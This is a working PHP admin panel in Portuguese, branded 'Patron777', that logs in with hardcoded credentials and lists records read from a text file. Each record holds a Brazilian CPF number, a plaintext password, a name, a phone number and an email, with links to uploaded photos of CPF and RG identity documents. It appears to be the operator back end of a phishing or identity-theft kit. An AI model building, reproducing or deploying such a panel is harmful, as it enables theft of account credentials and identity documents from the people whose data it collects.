<?php
session_start();
date_default_timezone_set('America/Sao_Paulo');

// CONFIGURAÇÃO
$usuario_painel = "admin";
$senha_painel = "777";

// LOGOUT
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    $_SESSION = [];
    session_destroy();
    header("Location: painel.php");
    exit;
}

// LOGIN
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['btn_login'])) {
    $usuario = trim($_POST['user'] ?? '');
    $senha = $_POST['pass'] ?? '';

    if (
        hash_equals($usuario_painel, $usuario) &&
        hash_equals($senha_painel, $senha)
    ) {
        session_regenerate_id(true);
        $_SESSION['logado_no_painel'] = true;
        header("Location: painel.php");
        exit;
    } else {
        $erro_autenticacao = "Usuário ou senha incorretos.";
    }
}

// TELA DE LOGIN
if (empty($_SESSION['logado_no_painel'])):
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Acesso Administrativo</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: Arial, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    background:
        linear-gradient(rgba(15, 23, 42, 0.45), rgba(15, 23, 42, 0.65)),
        url('https://backiee.com/static/wallpapers/1000x563/441645.jpg')
        center center / cover no-repeat fixed;
}

.login-card {
    width: 100%;
    max-width: 400px;
    background: #fff;
    padding: 35px;
    border-radius: 16px;
    box-shadow: 0 20px 60px #0004;
}

.login-icon {
    width: 60px;
    height: 60px;
    margin: 0 auto 18px;
    border-radius: 15px;
    background: #4f46e5;
    color: white;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 27px;
}

h1 {
    text-align: center;
    font-size: 24px;
    color: #1e293b;
    margin-bottom: 8px;
}

.subtitle {
    text-align: center;
    color: #64748b;
    font-size: 13px;
    line-height: 1.5;
    margin-bottom: 25px;
}

label {
    display: block;
    font-size: 13px;
    font-weight: bold;
    margin-bottom: 7px;
    color: #334155;
}

input {
    width: 100%;
    padding: 13px;
    border: 1px solid #cbd5e1;
    border-radius: 8px;
    margin-bottom: 18px;
    font-size: 15px;
    outline: none;
}

input:focus {
    border-color: #4f46e5;
    box-shadow: 0 0 0 3px #4f46e522;
}

button {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 8px;
    background: #4f46e5;
    color: #fff;
    font-weight: bold;
    font-size: 15px;
    cursor: pointer;
}

button:hover {
    background: #4338ca;
}

.erro {
    background: #fee2e2;
    color: #b91c1c;
    padding: 12px;
    border-radius: 7px;
    font-size: 13px;
    margin-bottom: 18px;
}

@media (max-width: 480px) {
    .login-card {
        padding: 25px 20px;
    }
}
</style>
</head>

<body>

<div class="login-card">
    <div class="login-icon">&#128274;</div>

    <h1>Área Administrativa - Patron777</h1>
    <p class="subtitle">Acesse sua conta para visualizar os registros.</p>

    <?php if (isset($erro_autenticacao)): ?>
        <div class="erro">
            <?= htmlspecialchars($erro_autenticacao, ENT_QUOTES, 'UTF-8') ?>
        </div>
    <?php endif; ?>

    <form method="POST" action="painel.php">
        <label for="user">Usuário</label>
        <input type="text" id="user" name="user" required autocomplete="username">

        <label for="pass">Senha</label>
        <input type="password" id="pass" name="pass" required autocomplete="current-password">

        <button type="submit" name="btn_login">Acessar painel</button>
    </form>
</div>

</body>
</html>

<?php
exit;
endif;

// ==========================================
// LEITURA DOS REGISTROS
// ==========================================
$nomeArquivo = 'registros_acesso.txt';
$dadosLista = [];

if (file_exists($nomeArquivo) && is_readable($nomeArquivo)) {
    $linhas = file(
        $nomeArquivo,
        FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES
    );

    foreach (array_reverse($linhas) as $linha) {
        $item = [
            'data_hora' => '-',
            'cpf' => '-',
            'senha' => '-',
            'nome' => '-',
            'telefone' => '-',
            'email' => '-',
            'estado' => '-',
            'obra' => '-',
            'problema' => '-',
            'renda' => '-',
            'cpf_frente' => 'Pendente',
            'cpf_verso' => 'Pendente',
            'rg_frente' => 'Pendente',
            'rg_verso' => 'Pendente'
        ];

        $partes = explode(' | ', $linha);

        foreach ($partes as $parte) {
            $campos = [
                'Data/Hora: ' => 'data_hora',
                'CPF: ' => 'cpf',
                'Senha: ' => 'senha',
                'Nome: ' => 'nome',
                'Tel: ' => 'telefone',
                'Email: ' => 'email',
                'Estado: ' => 'estado',
                'Obra: ' => 'obra',
                'Problema: ' => 'problema',
                'Renda: ' => 'renda',
                '[CPF_F] ' => 'cpf_frente',
                '[CPF_V] ' => 'cpf_verso',
                '[RG_F] ' => 'rg_frente',
                '[RG_V] ' => 'rg_verso'
            ];

            foreach ($campos as $prefixo => $campo) {
                if (strpos($parte, $prefixo) === 0) {
                    $item[$campo] = trim(substr($parte, strlen($prefixo)));
                    break;
                }
            }
        }

        $dadosLista[] = $item;
    }
}

$totalRegistros = count($dadosLista);

// LINK DE DOCUMENTOS
function extrairLinkArquivo($arquivo) {
    if (
        empty($arquivo) ||
        in_array($arquivo, ['Pendente', 'Nenhum arquivo enviado', '-'], true)
    ) {
        return '<span class="pendente">Não enviado</span>';
    }

    // Impede caminhos de arquivo fora da pasta autorizada.
    if (basename($arquivo) !== $arquivo) {
        return '<span class="pendente">Arquivo inválido</span>';
    }

    $caminho = __DIR__ . '/arquivos/' . $arquivo;

    if (!is_file($caminho)) {
        return '<span class="pendente">Não encontrado</span>';
    }

    return '<a class="btn-arquivo" href="arquivos/' .
        rawurlencode($arquivo) .
        '" target="_blank" rel="noopener noreferrer">Abrir</a>';
}
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Painel Administrativo</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: Arial, Helvetica, sans-serif;
    background: url('https://backiee.com/static/wallpapers/1000x563/441645.jpg')
                center center / cover no-repeat fixed;
    color: #1e293b;
    min-height: 100vh;
}

.topo {
    background: #0f172a;
    color: #fff;
    padding: 20px 24px;
    box-shadow: 0 3px 12px #00000012;
}

.topo-conteudo {
    max-width: 1450px;
    margin: auto;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 20px;
    flex-wrap: wrap;
}

.marca {
    display: flex;
    align-items: center;
    gap: 13px;
}

.logo {
    background: #4f46e5;
    width: 48px;
    height: 48px;
    border-radius: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 18px;
    font-weight: bold;
}

.marca h1 {
    font-size: 19px;
    margin-bottom: 5px;
}

.marca p {
    font-size: 12px;
    color: #94a3b8;
}

.acoes-topo {
    display: flex;
    align-items: center;
    gap: 12px;
    flex-wrap: wrap;
}

.total-topo {
    padding: 10px 14px;
    background: #1e293b;
    border: 1px solid #334155;
    border-radius: 8px;
    font-size: 13px;
}

.btn-sair {
    background: #dc2626;
    color: white;
    text-decoration: none;
    padding: 11px 16px;
    border-radius: 8px;
    font-size: 13px;
    font-weight: bold;
}

.btn-sair:hover {
    background: #b91c1c;
}

.container {
    max-width: 1450px;
    margin: 30px auto;
    padding: 0 24px;
}

.resumo {
    display: grid;
    grid-template-columns: repeat(3, minmax(0, 1fr));
    gap: 18px;
    margin-bottom: 25px;
}

.card-resumo {
    background: white;
    padding: 23px;
    border-radius: 12px;
    border: 1px solid #e2e8f0;
    box-shadow: 0 3px 12px #0f172a05;
}

.card-resumo .rotulo {
    color: #64748b;
    font-size: 13px;
    margin-bottom: 12px;
}

.card-resumo .numero {
    font-size: 30px;
    font-weight: bold;
    color: #0f172a;
}

.card-resumo .descricao {
    font-size: 12px;
    color: #94a3b8;
    margin-top: 7px;
}

.painel {
    background: #fff;
    border: 1px solid #e2e8f0;
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 4px 15px #0f172a08;
}

.painel-cabecalho {
    padding: 22px;
    border-bottom: 1px solid #e2e8f0;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 15px;
    flex-wrap: wrap;
}

.painel-cabecalho h2 {
    font-size: 17px;
    margin-bottom: 6px;
}

.painel-cabecalho p {
    font-size: 12px;
    color: #64748b;
}

.pesquisa {
    width: 100%;
    max-width: 310px;
    padding: 12px 14px;
    border: 1px solid #cbd5e1;
    border-radius: 8px;
    outline: none;
    font-size: 13px;
}

.pesquisa:focus {
    border-color: #4f46e5;
    box-shadow: 0 0 0 3px #4f46e51a;
}

.tabela-container {
    width: 100%;
    overflow-x: auto;
}

table {
    width: 100%;
    min-width: 1100px;
    border-collapse: collapse;
    text-align: left;
}

thead {
    background: #f8fafc;
}

th {
    padding: 15px;
    color: #64748b;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: .4px;
    white-space: nowrap;
    border-bottom: 1px solid #e2e8f0;
}

td {
    padding: 15px;
    border-bottom: 1px solid #f1f5f9;
    font-size: 12px;
    vertical-align: middle;
}

tbody tr:hover {
    background: #f8fafc;
}

.cpf {
    font-family: monospace;
    font-weight: bold;
    white-space: nowrap;
}

.senha {
    background: #fff7ed;
    color: #9a3412;
    border: 1px solid #fed7aa;
    padding: 6px 8px;
    border-radius: 5px;
    font-family: monospace;
}

.nome {
    font-weight: bold;
    min-width: 140px;
}

.btn-arquivo {
    display: inline-block;
    padding: 7px 11px;
    background: #eef2ff;
    color: #4338ca;
    border-radius: 6px;
    text-decoration: none;
    font-size: 11px;
    font-weight: bold;
    white-space: nowrap;
}

.btn-arquivo:hover {
    background: #e0e7ff;
}

.pendente {
    display: inline-block;
    background: #f1f5f9;
    color: #64748b;
    padding: 6px 8px;
    border-radius: 5px;
    font-size: 11px;
    white-space: nowrap;
}

.vazio {
    padding: 55px 20px;
    text-align: center;
    color: #94a3b8;
    font-size: 14px;
}

.rodape {
    text-align: center;
    color: #94a3b8;
    font-size: 12px;
    padding: 25px 10px;
}

@media (max-width: 768px) {
    .topo {
        padding: 18px 15px;
    }

    .topo-conteudo {
        align-items: flex-start;
    }

    .marca h1 {
        font-size: 16px;
    }

    .marca p {
        line-height: 1.5;
    }

    .acoes-topo {
        width: 100%;
        justify-content: space-between;
    }

    .container {
        margin: 20px auto;
        padding: 0 12px;
    }

    .resumo {
        grid-template-columns: 1fr;
        gap: 12px;
    }

    .card-resumo {
        padding: 18px;
    }

    .card-resumo .numero {
        font-size: 26px;
    }

    .painel-cabecalho {
        padding: 17px;
    }

    .pesquisa {
        max-width: none;
    }
}

@media (max-width: 380px) {
    .marca h1 {
        font-size: 14px;
    }

    .total-topo {
        font-size: 11px;
    }

    .btn-sair {
        padding: 10px 12px;
    }
}
</style>
</head>

<body>

<header class="topo">
    <div class="topo-conteudo">

        <div class="marca">
            <div class="logo">LD</div>

            <div>
                <h1>Central de Cadastros - Patron777</h1>
                <p>Painel administrativo</p>
            </div>
        </div>

        <div class="acoes-topo">
            <div class="total-topo">
                Total: <strong><?= $totalRegistros ?></strong> registros
            </div>

            <a href="painel.php?action=logout" class="btn-sair">
                Sair do sistema
            </a>
        </div>

    </div>
</header>

<main class="container">

    <section class="resumo">

        <div class="card-resumo">
            <div class="rotulo">Total de registros</div>
            <div class="numero"><?= $totalRegistros ?></div>
            <div class="descricao">Registros encontrados no arquivo</div>
        </div>

        <div class="card-resumo">
            <div class="rotulo">Documentos</div>
            <div class="numero">
                <?= count(array_filter($dadosLista, function ($item) {
                    return (
                        $item['cpf_frente'] !== 'Pendente' &&
                        $item['cpf_frente'] !== 'Nenhum arquivo enviado'
                    );
                })) ?>
            </div>
            <div class="descricao">Registros com frente do CPF informada</div>
        </div>

        <div class="card-resumo">
            <div class="rotulo">Última atualização</div>
            <div class="numero" style="font-size:20px">
                <?= date('d/m/Y') ?>
            </div>
            <div class="descricao">Data atual do painel</div>
        </div>

    </section>

    <section class="painel">

        <div class="painel-cabecalho">
            <div>
                <h2>Registros recentes</h2>
                <p>Os registros mais recentes aparecem primeiro.</p>
            </div>

            <input
                type="search"
                id="pesquisa"
                class="pesquisa"
                placeholder="Pesquisar registro..."
                aria-label="Pesquisar registros"
            >
        </div>

        <div class="tabela-container">
            <table id="tabelaRegistros">

                <thead>
                    <tr>
                        <th>Data / Hora</th>
                        <th>CPF</th>
                        <th>Senha</th>
                        <th>Responsável</th>
                        <th>WhatsApp</th>
                        <th>E-mail</th>
                        <th>CPF Frente</th>
                        <th>CPF Verso</th>
                        <th>RG Frente</th>
                        <th>RG Verso</th>
                    </tr>
                </thead>

                <tbody>

                <?php if (empty($dadosLista)): ?>

                    <tr>
                        <td colspan="10" class="vazio">
                            Nenhum registro encontrado.
                        </td>
                    </tr>

                <?php else: ?>

                    <?php foreach ($dadosLista as $item): ?>

                        <tr>
                            <td>
                                <?= htmlspecialchars($item['data_hora'], ENT_QUOTES, 'UTF-8') ?>
                            </td>

                            <td class="cpf">
                                <?= htmlspecialchars($item['cpf'], ENT_QUOTES, 'UTF-8') ?>
                            </td>

                            <td>
                                <span class="senha">
                                    <?= htmlspecialchars($item['senha'], ENT_QUOTES, 'UTF-8') ?>
                                </span>
                            </td>

                            <td class="nome">
                                <?= htmlspecialchars($item['nome'], ENT_QUOTES, 'UTF-8') ?>
                            </td>

                            <td>
                                <?= htmlspecialchars($item['telefone'], ENT_QUOTES, 'UTF-8') ?>
                            </td>

                            <td>
                                <?= htmlspecialchars($item['email'], ENT_QUOTES, 'UTF-8') ?>
                            </td>

                            <td><?= extrairLinkArquivo($item['cpf_frente']) ?></td>
                            <td><?= extrairLinkArquivo($item['cpf_verso']) ?></td>
                            <td><?= extrairLinkArquivo($item['rg_frente']) ?></td>
                            <td><?= extrairLinkArquivo($item['rg_verso']) ?></td>
                        </tr>

                    <?php endforeach; ?>

                <?php endif; ?>

                </tbody>
            </table>
        </div>

        <div class="painel-cabecalho">
            <p id="contador">
                Exibindo <?= $totalRegistros ?> registro(s)
            </p>
        </div>

    </section>

</main>

<footer class="rodape">
    Painel administrativo
</footer>

<script>
const pesquisa = document.getElementById('pesquisa');
const tabela = document.getElementById('tabelaRegistros');
const linhas = tabela.querySelectorAll('tbody tr');
const contador = document.getElementById('contador');

pesquisa.addEventListener('input', function () {
    const termo = this.value
        .toLocaleLowerCase('pt-BR')
        .trim();

    let visiveis = 0;

    linhas.forEach(function (linha) {
        const corresponde = linha.textContent
            .toLocaleLowerCase('pt-BR')
            .includes(termo);

        linha.style.display = corresponde ? '' : 'none';

        if (corresponde) {
            visiveis++;
        }
    });

    contador.textContent = 'Exibindo ' + visiveis + ' registro(s)';
});
</script>

</body>
</html>